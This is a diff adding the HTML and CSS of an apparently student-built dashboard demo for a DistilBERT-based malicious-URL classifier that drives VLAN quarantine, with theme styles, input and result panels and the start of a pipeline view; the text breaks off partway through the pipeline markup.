@@ -1,0 +1,1492 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Autonomous Malware Containment via SLM URL Detection — FYP Demo</title>
+<style>
+/* ════════════════ THEME TOKENS ════════════════ */
+:root, [data-theme="dark"] {
+  --bg: #0a0e1a;
+  --bg2: #111827;
+  --bg3: #1a2235;
+  --border: rgba(255,255,255,0.08);
+  --border2: rgba(255,255,255,0.14);
+  --text: #e2e8f0;
+  --text2: #94a3b8;
+  --text3: #64748b;
+  --accent: #3b82f6;
+  --accent2: #60a5fa;
+  --danger: #ef4444;
+  --danger2: #fca5a5;
+  --success: #22c55e;
+  --success2: #86efac;
+  --warn: #f59e0b;
+  --purple: #a78bfa;
+  --pink: #f472b6;
+  --teal: #2dd4bf;
+  /* SVG-specific, theme-aware */
+  --node-fill: rgba(30,41,59,0.85);
+  --link: #334155;
+  --svg-label: #94a3b8;
+  --shadow: 0 8px 24px rgba(0,0,0,0.4);
+  --font: 'Courier New', 'Consolas', monospace;
+  --sans: 'Segoe UI', system-ui, sans-serif;
+}
+[data-theme="light"] {
+  --bg: #eef2f7;
+  --bg2: #ffffff;
+  --bg3: #f1f5f9;
+  --border: rgba(15,23,42,0.10);
+  --border2: rgba(15,23,42,0.16);
+  --text: #0f172a;
+  --text2: #475569;
+  --text3: #64748b;
+  --accent: #2563eb;
+  --accent2: #1d4ed8;
+  --danger: #dc2626;
+  --danger2: #b91c1c;
+  --success: #16a34a;
+  --success2: #15803d;
+  --warn: #d97706;
+  --purple: #7c3aed;
+  --pink: #db2777;
+  --teal: #0d9488;
+  --node-fill: #ffffff;
+  --link: #94a3b8;
+  --svg-label: #475569;
+  --shadow: 0 8px 24px rgba(15,23,42,0.12);
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 13px; min-height: 100vh; overflow-x: hidden; transition: background 0.3s, color 0.3s; }
+
+/* ── HEADER ── */
+.header {
+  background: var(--bg2);
+  border-bottom: 1px solid var(--border);
+  padding: 10px 20px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  position: sticky;
+  top: 0;
+  z-index: 100;
+}
+.header-left { display: flex; align-items: center; gap: 12px; }
+.header-logo {
+  width: 32px; height: 32px;
+  background: linear-gradient(135deg, var(--accent), var(--purple));
+  border-radius: 8px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 16px; font-weight: 700; color: #fff;
+  font-family: var(--font);
+}
+.header-title { font-size: 13px; font-weight: 700; color: var(--text); letter-spacing: 0.02em; line-height: 1.25; max-width: 720px; }
+.header-sub { font-size: 11px; color: var(--text3); }
+.header-right { display:flex; align-items:center; gap:18px; }
+.header-status { display: flex; align-items: center; gap: 6px; font-size: 11px; color: var(--text2); }
+.status-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--success); animation: pulse-dot 2s infinite; }
+@keyframes pulse-dot { 0%,100%{box-shadow:0 0 0 0 rgba(34,197,94,0.4)} 50%{box-shadow:0 0 0 5px rgba(34,197,94,0)} }
+.header-time { font-family: var(--font); font-size: 11px; color: var(--text3); }
+
+/* ── THEME TOGGLE ── */
+.theme-toggle {
+  display: inline-flex; align-items: center; gap: 6px;
+  background: var(--bg3); border: 1px solid var(--border2);
+  border-radius: 20px; padding: 4px 6px; cursor: pointer;
+  font-size: 11px; color: var(--text2); transition: border-color .2s;
+}
+.theme-toggle:hover { border-color: var(--accent); }
+.theme-toggle .tt-icon { font-size: 13px; line-height: 1; }
+.theme-toggle .tt-label { font-weight: 600; }
+
+/* ── LAYOUT ── */
+.main { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 12px 16px; max-width: 1600px; margin: 0 auto; }
+
+/* ── CONTROL STRIP (department selector) ── */
+.control-strip {
+  grid-column: 1 / -1; background: var(--bg2); border: 1px solid var(--border);
+  border-radius: 10px; padding: 10px 14px; display: flex; align-items: center;
+  gap: 14px; flex-wrap: wrap;
+}
+.control-strip .cs-label { font-size: 10px; color: var(--text3); text-transform: uppercase; letter-spacing: 0.08em; }
+.dept-tabs { display: flex; gap: 6px; flex-wrap: wrap; }
+.dept-tab {
+  background: var(--bg); border: 1px solid var(--border2); border-radius: 7px;
+  padding: 7px 14px; font-size: 11px; font-weight: 600; color: var(--text2);
+  cursor: pointer; transition: all 0.15s; display: flex; align-items: center; gap: 7px;
+}
+.dept-tab .dt-vlan { font-family: var(--font); font-size: 9px; color: var(--text3); }
+.dept-tab:hover { border-color: var(--accent); color: var(--accent2); }
+.dept-tab.active { border-color: var(--accent); background: rgba(59,130,246,0.12); color: var(--accent2); }
+.dept-tab.active .dt-vlan { color: var(--accent2); }
+.cs-hint { font-size: 10.5px; color: var(--text3); margin-left: auto; }
+
+/* ── METRICS BAR ── */
+.metrics-bar { grid-column: 1 / -1; display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; }
+.metric-card { background: var(--bg2); border: 1px solid var(--border); border-radius: 10px; padding: 14px 16px; position: relative; overflow: hidden; }
+.metric-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px; }
+.metric-card.m-total::before { background: var(--accent); }
+.metric-card.m-mal::before { background: var(--danger); }
+.metric-card.m-ben::before { background: var(--success); }
+.metric-card.m-mttr::before { background: var(--warn); }
+.metric-label { font-size: 10px; color: var(--text3); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 6px; }
+.metric-value { font-size: 28px; font-weight: 700; font-family: var(--font); line-height: 1; }
+.metric-card.m-total .metric-value { color: var(--accent2); }
+.metric-card.m-mal .metric-value { color: var(--danger2); }
+.metric-card.m-ben .metric-value { color: var(--success2); }
+.metric-card.m-mttr .metric-value { color: var(--warn); }
+.metric-sub { font-size: 10px; color: var(--text3); margin-top: 4px; }
+
+/* ── PANELS ── */
+.panel { background: var(--bg2); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
+.panel-header { padding: 10px 14px; border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 8px; background: var(--bg3); }
+.panel-icon { width: 20px; height: 20px; border-radius: 5px; display: flex; align-items: center; justify-content: center; font-size: 11px; font-weight: 700; }
+.panel-title { font-size: 12px; font-weight: 600; color: var(--text); }
+.panel-body { padding: 14px; }
+
+/* ── URL INPUT ── */
+.url-input-wrap { display: flex; gap: 8px; margin-bottom: 12px; }
+.url-input { flex: 1; background: var(--bg); border: 1px solid var(--border2); border-radius: 7px; padding: 8px 12px; color: var(--text); font-family: var(--font); font-size: 12px; outline: none; transition: border-color 0.2s; }
+.url-input:focus { border-color: var(--accent); }
+.btn-primary { background: var(--accent); color: #fff; border: none; border-radius: 7px; padding: 8px 16px; font-size: 12px; font-weight: 600; cursor: pointer; transition: background 0.15s, transform 0.1s; white-space: nowrap; }
+.btn-primary:hover { background: var(--accent2); }
+.btn-primary:active { transform: scale(0.97); }
+.btn-primary:disabled { background: var(--text3); cursor: not-allowed; }
+.sample-label { font-size: 10px; color: var(--text3); margin-bottom: 7px; text-transform: uppercase; letter-spacing: 0.06em; }
+.sample-grid { display: flex; flex-wrap: wrap; gap: 6px; }
+.sample-btn { background: var(--bg); border: 1px solid var(--border2); border-radius: 20px; padding: 4px 10px; font-size: 10px; font-family: var(--font); color: var(--text2); cursor: pointer; transition: all 0.15s; max-width: 220px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+.sample-btn:hover { border-color: var(--accent); color: var(--accent2); background: rgba(59,130,246,0.05); }
+.sample-btn.mal { border-color: rgba(239,68,68,0.35); color: var(--danger2); }
+.sample-btn.mal:hover { border-color: var(--danger); background: rgba(239,68,68,0.05); }
+.sample-btn.ben { border-color: rgba(34,197,94,0.35); color: var(--success2); }
+.sample-btn.ben:hover { border-color: var(--success); background: rgba(34,197,94,0.05); }
+
+/* ── RESULT PANEL ── */
+.result-empty { text-align: center; padding: 30px; color: var(--text3); font-size: 12px; }
+.result-empty-icon { font-size: 28px; margin-bottom: 8px; opacity: 0.4; }
+.result-card { background: var(--bg); border: 1px solid var(--border); border-radius: 10px; padding: 14px; display: none; }
+.result-card.visible { display: block; }
+.result-label-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 10px; }
+.result-badge { padding: 4px 12px; border-radius: 20px; font-size: 11px; font-weight: 700; letter-spacing: 0.06em; text-transform: uppercase; }
+.result-badge.malicious { background: rgba(239,68,68,0.15); color: var(--danger2); border: 1px solid rgba(239,68,68,0.3); }
+.result-badge.benign { background: rgba(34,197,94,0.12); color: var(--success2); border: 1px solid rgba(34,197,94,0.25); }
+.result-url { font-family: var(--font); font-size: 10px; color: var(--text3); margin-bottom: 12px; word-break: break-all; }
+.conf-label { font-size: 10px; color: var(--text3); margin-bottom: 5px; display: flex; justify-content: space-between; }
+.conf-bar-track { background: var(--bg3); border-radius: 4px; height: 6px; overflow: hidden; margin-bottom: 10px; }
+.conf-bar-fill { height: 100%; border-radius: 4px; transition: width 0.6s ease; }
+.conf-bar-fill.malicious { background: linear-gradient(90deg, #dc2626, #ef4444); }
+.conf-bar-fill.benign { background: linear-gradient(90deg, #16a34a, #22c55e); }
+.result-meta { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 10px; }
+.result-meta-item { background: var(--bg3); border-radius: 6px; padding: 7px 10px; }
+.result-meta-label { font-size: 9px; color: var(--text3); text-transform: uppercase; letter-spacing: 0.07em; }
+.result-meta-val { font-size: 12px; font-weight: 600; color: var(--text); font-family: var(--font); margin-top: 2px; }
+.action-box { margin-top: 12px; border-radius: 8px; padding: 10px 12px; font-size: 11px; display: none; border-left: 3px solid; }
+.action-box.quarantine { background: rgba(239,68,68,0.07); border-color: var(--danger); color: var(--danger2); display: block; }
+.action-box.cleared { background: rgba(34,197,94,0.06); border-color: var(--success); color: var(--success2); display: block; }
+.action-box-title { font-weight: 700; margin-bottom: 3px; font-size: 10px; text-transform: uppercase; letter-spacing: 0.07em; }
+
+/* ══════ ENDPOINT (PC) SCREEN PANEL ══════ */
+.endpoint-panel { grid-column: 1 / -1; }
+.ep-split { display: grid; grid-template-columns: 1.05fr 1fr; gap: 14px; }
+@media (max-width: 900px){ .ep-split { grid-template-columns: 1fr; } }
+/* fake Windows window */
+.win {
+  border: 1px solid var(--border2); border-radius: 8px; overflow: hidden;
+  background: var(--bg); box-shadow: var(--shadow); display: flex; flex-direction: column;
+  min-height: 320px;
+}
+.win-titlebar {
+  display: flex; align-items: center; gap: 8px; padding: 6px 10px;
+  background: linear-gradient(180deg, var(--bg3), var(--bg2));
+  border-bottom: 1px solid var(--border);
+}
+.win-os { font-size: 10px; color: var(--text3); display:flex; align-items:center; gap:6px; }
+.win-os .winlogo { width:12px; height:12px; display:inline-grid; grid-template-columns:1fr 1fr; gap:1px; }
+.win-os .winlogo span { background: var(--accent2); border-radius:1px; }
+.win-host { font-size: 11px; font-weight: 600; color: var(--text2); }
+.win-ctrls { margin-left: auto; display: flex; gap: 6px; }
+.win-ctrls i { width: 11px; height: 11px; border-radius: 50%; display: inline-block; }
+.win-ctrls .c1 { background: #f59e0b; } .win-ctrls .c2 { background: #22c55e; } .win-ctrls .c3 { background: #ef4444; }
+/* browser chrome */
+.bro-bar { display: flex; align-items: center; gap: 8px; padding: 7px 10px; background: var(--bg2); border-bottom: 1px solid var(--border); }
+.bro-nav { display:flex; gap:5px; color: var(--text3); font-size: 12px; }
+.bro-addr { flex: 1; display: flex; align-items: center; gap: 7px; background: var(--bg3); border: 1px solid var(--border2); border-radius: 16px; padding: 5px 12px; }
+.bro-lock { font-size: 11px; }
+.ep-url { font-family: var(--font); font-size: 10.5px; color: var(--text2); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; flex: 1; }
+.ep-url.blocked { text-decoration: line-through; color: var(--danger2); }
+.ep-badge { font-size: 9px; font-weight: 700; padding: 2px 8px; border-radius: 10px; text-transform: uppercase; letter-spacing: .05em; white-space: nowrap; }
+.ep-badge.ok { background: rgba(34,197,94,0.12); color: var(--success2); }
+.ep-badge.bad { background: rgba(239,68,68,0.15); color: var(--danger2); }
+/* page bodies */
+.ep-body { flex: 1; padding: 16px; transition: background 0.4s; }
+.ep-body.normal { background: var(--bg2); }
+.ep-body.walled {
+  background: repeating-linear-gradient(45deg, rgba(239,68,68,0.06), rgba(239,68,68,0.06) 12px, rgba(239,68,68,0.02) 12px, rgba(239,68,68,0.02) 24px);
+}
+/* normal intranet mock */
+.intra-top { display: flex; align-items: center; gap: 10px; margin-bottom: 14px; }
+.intra-logo { width: 26px; height: 26px; border-radius: 6px; background: linear-gradient(135deg, var(--accent), var(--teal)); display:flex; align-items:center; justify-content:center; color:#fff; font-weight:700; font-size:12px; }
+.intra-name { font-size: 13px; font-weight: 700; color: var(--text); }
+.intra-name span { font-weight: 400; color: var(--text3); font-size: 11px; }
+.intra-search { background: var(--bg3); border: 1px solid var(--border2); border-radius: 8px; padding: 8px 12px; font-size: 11px; color: var(--text3); margin-bottom: 14px; }
+.intra-tiles { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
+.intra-tile { background: var(--bg3); border: 1px solid var(--border); border-radius: 8px; padding: 12px 10px; text-align: center; }
+.intra-tile .tile-ico { font-size: 18px; margin-bottom: 6px; }
+.intra-tile .tile-t { font-size: 10px; color: var(--text2); font-weight: 600; }
+.intra-foot { margin-top: 14px; font-size: 10px; color: var(--text3); display:flex; align-items:center; gap:6px; }
+.intra-foot .fdot { width:6px; height:6px; border-radius:50%; background: var(--success); }
+/* walled garden mock */
+.wall { text-align: center; padding: 8px 4px; }
+.wall-shield { font-size: 40px; line-height: 1; margin-bottom: 8px; }
+.wall-h { font-size: 17px; font-weight: 800; color: var(--danger2); letter-spacing: 0.01em; }
+.wall-sub { font-size: 11px; color: var(--text2); margin: 6px 0 14px; }
+.wall-card { background: var(--bg2); border: 1px solid rgba(239,68,68,0.3); border-radius: 10px; padding: 12px 14px; text-align: left; max-width: 380px; margin: 0 auto 12px; }
+.wall-row { display: flex; justify-content: space-between; font-size: 11px; padding: 4px 0; border-bottom: 1px dashed var(--border); }
+.wall-row:last-child { border-bottom: none; }
+.wall-row .k { color: var(--text3); } .wall-row .v { font-family: var(--font); color: var(--text2); font-weight: 600; }
+.wall-row .v.red { color: var(--danger2); }
+.wall-steps { font-size: 10.5px; color: var(--text3); max-width: 380px; margin: 0 auto; text-align: left; line-height: 1.6; }
+.wall-served { font-size: 9.5px; color: var(--text3); margin-top: 12px; opacity: .85; }
+
+/* ══════ ORCHESTRATION CONSOLE ══════ */
+.orch-meta { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; margin-bottom: 10px; }
+.orch-badge { font-size: 10px; font-weight: 700; padding: 4px 10px; border-radius: 14px; letter-spacing: .04em; background: var(--bg3); color: var(--text3); border: 1px solid var(--border2); }
+.orch-badge.bad { background: rgba(239,68,68,0.12); color: var(--danger2); border-color: rgba(239,68,68,0.35); }
+.orch-badge.ok { background: rgba(34,197,94,0.12); color: var(--success2); border-color: rgba(34,197,94,0.3); }
+.orch-actions { margin-left: auto; display: flex; gap: 8px; }
+.btn-ghost { background: var(--bg); border: 1px solid var(--border2); border-radius: 7px; padding: 6px 12px; font-size: 11px; font-weight: 600; color: var(--text2); cursor: pointer; transition: all .15s; }
+.btn-ghost:hover:not(:disabled) { border-color: var(--success); color: var(--success2); }
+.btn-ghost:disabled { opacity: .4; cursor: not-allowed; }
+.terminal {
+  background: var(--bg); border: 1px solid var(--border2); border-radius: 9px;
+  padding: 12px 14px; font-family: var(--font); font-size: 11px; line-height: 1.65;
+  max-height: 280px; overflow-y: auto; white-space: pre-wrap; word-break: break-word;
+}
+.term-line { animation: fadeIn .2s ease; }
+.term-line .prompt { color: var(--teal); }
+.c-muted { color: var(--text3); }
+.c-orch { color: var(--accent2); font-weight: 600; }
+.c-cmd { color: var(--text2); }
+.c-deny { color: var(--danger2); }
+.c-warn { color: var(--warn); }
+.c-ok { color: var(--success2); }
+.pipe-loc {
+  display: flex; align-items: center; gap: 8px; background: rgba(167,139,250,0.08);
+  border: 1px solid rgba(167,139,250,0.25); border-radius: 8px; padding: 8px 12px; margin-bottom: 14px;
+  font-size: 11px; color: var(--text2);
+}
+.pipe-loc .ploc-badge { font-size: 9px; font-weight: 700; padding: 2px 8px; border-radius: 10px; background: rgba(167,139,250,0.18); color: var(--purple); letter-spacing: .05em; white-space:nowrap; }
+.pipe-flow { display: grid; grid-template-columns: repeat(5, 1fr); gap: 0; align-items: stretch; }
+@media (max-width: 820px){ .pipe-flow { grid-template-columns: 1fr 1fr; } }
+.pstage { position: relative; background: var(--bg); border: 1px solid var(--border2); border-radius: 9px; padding: 11px 12px; margin: 4px; transition: all 0.3s; }
+.pstage .pstep { font-family: var(--font); font-size: 9px; color: var(--text3); }
+.pstage .ptitle { font-size: 11px; font-weight: 700; color: var(--text); margin: 3px 0 4px; }
+.pstage .pdesc { font-size: 9.5px; color: var(--text3); line-height: 1.4; }
+.pstage.active { border-color: var(--accent); background: rgba(59,130,246,0.07); box-shadow: 0 0 0 1px var(--accent); }
+.pstage.done { border-color: rgba(34,197,94,0.4); }
+.pstage.danger { border-color: var(--danger); background: rgba(239,68,68,0.07); box-shadow: 0 0 0 1px var(--danger); }
+.pstage .ptick { position: absolute; top: 8px; right: 9px; font-size: 11px; opacity: 0; transition: opacity .2s; }
+.pstage.done .ptick { opacity: 1; }
+.pipe-detail { margin-top: 14px; display: grid; grid-template-columns: 1.3fr 1fr; gap: 12px; }
+@media (max-width: 820px){ .pipe-detail { grid-template-columns: 1fr; } }
+.pd-box { background: var(--bg); border: 1px solid var(--border); border-radius: 9px; padding: 11px 12px; }
+.pd-box .pd-title { font-size: 10px; color: var(--text3); text-transform: uppercase; letter-spacing: .07em; margin-bottom: 8px; }
+.token-wrap { display: flex; flex-wrap: wrap; gap: 4px; min-height: 26px; }
+.tok { font-family: var(--font); font-size: 10px; padding: 3px 7px; border-radius: 5px; background: var(--bg3); color: var(--text2); border: 1px solid var(--border2); }
+.tok.sep { color: var(--text3); opacity: .7; padding: 3px 5px; }
+.tok.sus { background: rgba(239,68,68,0.12); color: var(--danger2); border-color: rgba(239,68,68,0.35); }
+.tok.placeholder { color: var(--text3); border-style: dashed; }
+.attn-row { display: flex; align-items: center; gap: 8px; margin: 5px 0; }
+.attn-tok { font-family: var(--font); font-size: 10px; color: var(--text2); width: 96px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.attn-track { flex: 1; height: 7px; background: var(--bg3); border-radius: 4px; overflow: hidden; }
+.attn-fill { height: 100%; background: linear-gradient(90deg, var(--accent), var(--danger)); width: 0; transition: width 0.7s ease; }
+.attn-val { font-family: var(--font); font-size: 9px; color: var(--text3); width: 34px; text-align: right; }
+.pd-verdict { font-size: 11px; line-height: 1.6; color: var(--text2); }
+.pd-verdict b { color: var(--text); }
+
+/* ── NETWORK TOPOLOGY ── */
+.topo-panel { grid-column: 1 / -1; }
+.topo-container { position: relative; width: 100%; overflow: hidden; padding: 14px; }
+#topo-svg { width: 100%; height: auto; display: block; }
+.zone-dmz   { fill: rgba(34,197,94,0.05);   stroke: #22c55e; stroke-dasharray: 5,3; stroke-width: 1.2; }
+.zone-mgmt  { fill: rgba(167,139,250,0.07); stroke: #a78bfa; stroke-dasharray: 5,3; stroke-width: 1.2; }
+.zone-vlan  { fill: rgba(56,189,248,0.06);  stroke: #38bdf8; stroke-dasharray: 5,3; stroke-width: 1.2; transition: fill .4s, stroke .4s; }
+.zone-qnt   { fill: rgba(244,114,182,0.08); stroke: #f472b6; stroke-dasharray: 5,3; stroke-width: 1.2; }
+.zone-qnt.active { fill: rgba(244,114,182,0.18); }
+.zone-vlan.infected { fill: rgba(239,68,68,0.12) !important; stroke: #ef4444 !important; }
+.zone-vlan.selected { stroke-width: 2; }
+.node-label { font-family: var(--sans); font-size: 9px; fill: var(--svg-label); text-anchor: middle; }
+.node-body { fill: var(--node-fill); }
+.zone-label { font-family: var(--sans); font-size: 9px; font-weight: 600; text-anchor: middle; }
+.zone-label.dmz  { fill: #4ade80; }
+.zone-label.mgmt { fill: #a78bfa; }
+.zone-label.vlan { fill: #38bdf8; }
+.zone-label.qnt  { fill: #ec4899; }
+.link       { stroke: var(--link); stroke-width: 1; fill: none; }
+.link-qnt   { stroke: #f472b6; stroke-width: 1.5; stroke-dasharray: 5,3; fill: none; opacity: 0; transition: opacity 0.5s; }
+.link-qnt.visible { opacity: 1; animation: dash-move 1.5s linear infinite; }
+.link-mirror { stroke: #a78bfa; stroke-width: 1.3; stroke-dasharray: 4,3; fill: none; opacity: 0; transition: opacity .4s; }
+.link-mirror.visible { opacity: .8; animation: dash-move 1.4s linear infinite; }
+@keyframes dash-move { to { stroke-dashoffset: -16; } }
+.infected-pc { transition: all 0.5s ease; }
+.topo-tooltip { font-family: var(--sans); font-size: 8.5px; opacity: 0; transition: opacity 0.4s; pointer-events: none; }
+.topo-tooltip.visible { opacity: 1; }
+.packet { filter: url(#glow); }
+.topo-legend { display: flex; flex-wrap: wrap; gap: 18px; padding: 4px 4px 0; margin-top: 6px; border-top: 1px solid var(--border); padding-top: 12px; }
+.tl-item { display: inline-flex; align-items: center; gap: 7px; font-size: 10.5px; color: var(--text3); }
+.tl-dot { width: 9px; height: 9px; border-radius: 50%; flex-shrink: 0; box-shadow: 0 0 5px currentColor; }
+
+/* ── CHART ── */
+.chart-area { grid-column: 1 / -1; display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+.timeline { height: 220px; overflow-y: auto; }
+.timeline::-webkit-scrollbar { width: 4px; }
+.timeline::-webkit-scrollbar-track { background: var(--bg3); }
+.timeline::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 2px; }
+.log-entry { display: flex; gap: 10px; padding: 7px 0; border-bottom: 1px solid var(--border); align-items: flex-start; animation: fadeIn 0.3s ease; }
+@keyframes fadeIn { from{opacity:0;transform:translateY(-4px)} to{opacity:1;transform:translateY(0)} }
+.log-entry:last-child { border-bottom: none; }
+.log-time { font-family: var(--font); font-size: 9px; color: var(--text3); white-space: nowrap; padding-top: 1px; }
+.log-dot { width: 6px; height: 6px; border-radius: 50%; margin-top: 3px; flex-shrink: 0; }
+.log-dot.mal { background: var(--danger); } .log-dot.ben { background: var(--success); }
+.log-dot.sys { background: var(--text3); } .log-dot.qnt { background: var(--pink); }
+.log-text { font-size: 11px; color: var(--text2); line-height: 1.4; }
+.log-text .url { font-family: var(--font); font-size: 10px; color: var(--text3); }
+.spinner { display: none; width: 14px; height: 14px; border: 2px solid var(--border2); border-top-color: var(--accent); border-radius: 50%; animation: spin 0.6s linear infinite; margin-left: 8px; }
+.spinner.active { display: inline-block; }
+@keyframes spin { to { transform: rotate(360deg); } }
+* { scrollbar-width: thin; scrollbar-color: var(--border2) transparent; }
+.backend-strip { grid-column: 1 / -1; background: var(--bg3); border: 1px solid var(--border); border-radius: 8px; padding: 8px 14px; display: flex; align-items: center; gap: 8px; justify-content: space-between; }
+.backend-left { display: flex; align-items: center; gap: 8px; }
+.backend-indicator { width: 7px; height: 7px; border-radius: 50%; background: var(--warn); flex-shrink: 0; }
+.backend-indicator.live { background: var(--success); animation: pulse-dot 2s infinite; }
+.backend-indicator.heuristic { background: var(--warn); }
+.backend-text { font-size: 11px; color: var(--text2); }
+.backend-mode { font-size: 10px; padding: 2px 8px; border-radius: 10px; background: rgba(245,158,11,0.12); color: var(--warn); font-weight: 600; }
+.backend-mode.live-mode { background: rgba(34,197,94,0.1); color: var(--success2); }
+
+@media (prefers-reduced-motion: reduce){
+  .link-qnt.visible, .link-mirror.visible { animation: none; }
+  .status-dot, .backend-indicator.live { animation: none; }
+}
+</style>
+</head>
+<body>
+
+<!-- ══════════ HEADER ══════════ -->
+<header class="header">
+  <div class="header-left">
+    <div class="header-logo">SLM</div>
+    <div>
+      <div class="header-title">AUTONOMOUS MALWARE CONTAINMENT VIA SMALL LANGUAGE MODEL (SLM) URL DETECTION</div>
+      <div class="header-sub">DistilBERT Classification Engine · VLAN Orchestration Framework · BAXU3973 FYP Demo</div>
+    </div>
+  </div>
+  <div class="header-right">
+    <button class="theme-toggle" id="theme-toggle" onclick="toggleTheme()" aria-label="Toggle colour theme">
+      <span class="tt-icon" id="tt-icon">🌙</span>
+      <span class="tt-label" id="tt-label">Dark</span>
+    </button>
+    <div class="header-status"><div class="status-dot"></div>System operational</div>
+    <div class="header-time" id="clock">--:--:--</div>
+  </div>
+</header>
+
+<!-- ══════════ MAIN GRID ══════════ -->
+<div class="main">
+
+  <!-- BACKEND STATUS STRIP -->
+  <div class="backend-strip">
+    <div class="backend-left">
+      <div class="backend-indicator heuristic" id="backend-dot"></div>
+      <span class="backend-text" id="backend-text">Classification engine: <strong>Heuristic mode</strong> (DistilBERT backend not connected)</span>
+    </div>
+    <div style="display:flex;align-items:center;gap:8px">
+      <span class="backend-mode" id="backend-badge">HEURISTIC</span>
+      <button class="btn-primary" style="font-size:10px;padding:5px 10px" onclick="pingBackend()">Connect model</button>
+    </div>
+  </div>
+
+  <!-- DEPARTMENT SELECTOR -->
+  <div class="control-strip">
+    <span class="cs-label">Target endpoint</span>
+    <div class="dept-tabs" id="dept-tabs">
+      <button class="dept-tab active" data-dept="eng" onclick="selectDept('eng')">Engineering <span class="dt-vlan">VLAN 10</span></button>
+      <button class="dept-tab" data-dept="fin" onclick="selectDept('fin')">Finance <span class="dt-vlan">VLAN 20</span></button>
+      <button class="dept-tab" data-dept="hr" onclick="selectDept('hr')">Human Resources <span class="dt-vlan">VLAN 30</span></button>
+    </div>
+    <span class="cs-hint">Pick which department's PC visits the URL, then run a classification to see its containment flow.</span>
+  </div>
+
+  <!-- METRICS BAR -->
+  <div class="metrics-bar">
+    <div class="metric-card m-total">
+      <div class="metric-label">URLs analysed</div>
+      <div class="metric-value" id="m-total">0</div>
+      <div class="metric-sub">total classifications</div>
+    </div>
+    <div class="metric-card m-mal">
+      <div class="metric-label">Malicious detected</div>
+      <div class="metric-value" id="m-mal">0</div>
+      <div class="metric-sub" id="m-mal-pct">— %</div>
+    </div>
+    <div class="metric-card m-ben">
+      <div class="metric-label">Benign cleared</div>
+      <div class="metric-value" id="m-ben">0</div>
+      <div class="metric-sub" id="m-ben-pct">— %</div>
+    </div>
+    <div class="metric-card m-mttr">
+      <div class="metric-label">Avg MTTR</div>
+      <div class="metric-value" id="m-mttr">—</div>
+      <div class="metric-sub">automated response time</div>
+    </div>
+  </div>
+
+  <!-- LEFT: URL INPUT -->
+  <div class="panel">
+    <div class="panel-header">
+      <div class="panel-icon" style="background:rgba(59,130,246,0.15);color:var(--accent)">⌨</div>
+      <span class="panel-title">URL Classification Input</span>
+      <div class="spinner" id="spinner"></div>
+    </div>
+    <div class="panel-body">
+      <div class="url-input-wrap">
+        <input class="url-input" id="url-input" type="text" placeholder="https://example.com/path?query=value" spellcheck="false" onkeydown="if(event.key==='Enter') classifyURL()" />
+        <button class="btn-primary" id="classify-btn" onclick="classifyURL()">Analyse</button>
+      </div>
+      <div class="sample-label">Quick test samples</div>
+      <div class="sample-grid" id="sample-grid"></div>
+    </div>
+  </div>
+
+  <!-- RIGHT: CLASSIFICATION RESULT -->
+  <div class="panel">
+    <div class="panel-header">
+      <div class="panel-icon" style="background:rgba(167,139,250,0.12);color:var(--purple)">⚡</div>
+      <span class="panel-title">DistilBERT Classification Result</span>
+    </div>
+    <div class="panel-body">
+      <div class="result-empty" id="result-empty">
+        <div class="result-empty-icon">🔍</div>
+        Awaiting URL input.<br>Enter a URL or select a sample above.
+      </div>
+      <div class="result-card" id="result-card">
+        <div class="result-label-row">
+          <span class="result-badge" id="result-badge">—</span>
+          <span style="font-size:10px;color:var(--text3)">Model: DistilBERT (fine-tuned)</span>
+        </div>
+        <div class="result-url" id="result-url"></div>
+        <div class="conf-label">
+          <span>Confidence score</span>
+          <span id="conf-pct" style="font-family:var(--font);font-weight:700"></span>
+        </div>
+        <div class="conf-bar-track"><div class="conf-bar-fill" id="conf-bar" style="width:0%"></div></div>
+        <div class="result-meta">
+          <div class="result-meta-item"><div class="result-meta-label">Inference time</div><div class="result-meta-val" id="infer-time">—</div></div>
+          <div class="result-meta-item"><div class="result-meta-label">Classification</div><div class="result-meta-val" id="infer-class">—</div></div>
+          <div class="result-meta-item"><div class="result-meta-label">VLAN action</div><div class="result-meta-val" id="vlan-action">—</div></div>
+          <div class="result-meta-item"><div class="result-meta-label">Isolation MTTR</div><div class="result-meta-val" id="mttr-val">—</div></div>
+        </div>
+        <div class="action-box" id="action-box">
+          <div class="action-box-title" id="action-title"></div>
+          <div id="action-desc"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════ DETECTION PIPELINE ══════════ -->
+  <div class="panel endpoint-panel">
+    <div class="panel-header">
+      <div class="panel-icon" style="background:rgba(167,139,250,0.14);color:var(--purple)">🧠</div>
+      <span class="panel-title">Detection Pipeline — How the Model Flags a Malicious URL</span>
+      <span style="font-size:10px;color:var(--text3);margin-left:auto">Stage: <span id="pipe-stage-label" style="color:var(--text2)">idle</span></span>
+    </div>
+    <div class="panel-body">
+      <div class="pipe-loc">
+        <span class="ploc-badge">DistilBERT engine</span>
+        <span>The classifier runs on the <strong>Management Server (VLAN 100 Management)</strong>. Mirrored traffic from the core switch is fed to the local model — no traffic leaves the network for inference.</span>
+      </div>
+
+      <div class="pipe-flow">
+        <div class="pstage" id="stage-1"><span class="ptick">✓</span><div class="pstep">01</div><div class="ptitle">Packet capture</div><div class="pdesc">Core switch mirror port copies the HTTP/DNS request to the Management Server.</div></div>
